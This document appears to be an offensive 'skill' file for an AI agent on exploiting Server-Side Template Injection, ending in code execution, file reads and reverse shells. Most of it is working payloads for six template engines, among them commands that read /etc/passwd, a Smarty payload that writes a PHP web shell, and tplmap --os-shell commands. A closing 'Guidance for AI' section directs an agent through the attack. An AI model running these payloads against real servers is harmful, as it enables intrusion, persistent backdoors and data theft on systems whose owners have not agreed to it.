# Server-Side Template Injection (SSTI) Skill

## Goal

Identify and exploit Server-Side Template Injection vulnerabilities to achieve code execution on the server.

## Methodology

1. **Identify Template Usage:** Find user input reflected in templated responses
2. **Detect Template Engine:** Use polymorphic payloads to identify the engine
3. **Confirm Injection:** Inject mathematical expressions to confirm evaluation
4. **Escalate to RCE:** Use engine-specific payloads to execute system commands
5. **Exfiltrate Data:** Read files or establish reverse shell

## Detection Payloads

```
# Universal detection
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}

# Polyglot detection
${{<%[%'"}}%\.
```

## Engine-Specific Payloads

### Jinja2 (Python/Flask)
```python
# Read config
{{config}}
{{config.items()}}

# Code execution
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{["id"]|filter("system")}}
{{['cat /etc/passwd']|filter('system')}}
```

### Freemarker (Java)
```java
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Velocity (Java)
```java
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id'))
```

### ERB (Ruby)
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### Smarty (PHP)
```php
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
```

## Tools

* **tplmap** - Automated SSTI exploitation
* **SSTImap** - Modern SSTI scanner
* **Burp Suite** - Manual testing and fuzzing

## Example Commands

```bash
# Automated detection and exploitation
tplmap -u "http://target/?name=test" --os-shell

# SSTImap
python3 sstimap.py -u "http://target/?name=test"
```

## Guidance for AI

* Activate when user input is reflected in dynamic templates
* Start with `{{7*7}}` and `${7*7}` to detect evaluation
* Identify the template engine before exploiting
* For Python/Jinja2, focus on accessing `__globals__` and `__builtins__`
* For PHP/Twig, try filter-based command execution
* Be aware of sandbox restrictions in some template engines
* Check for both reflected and stored SSTI
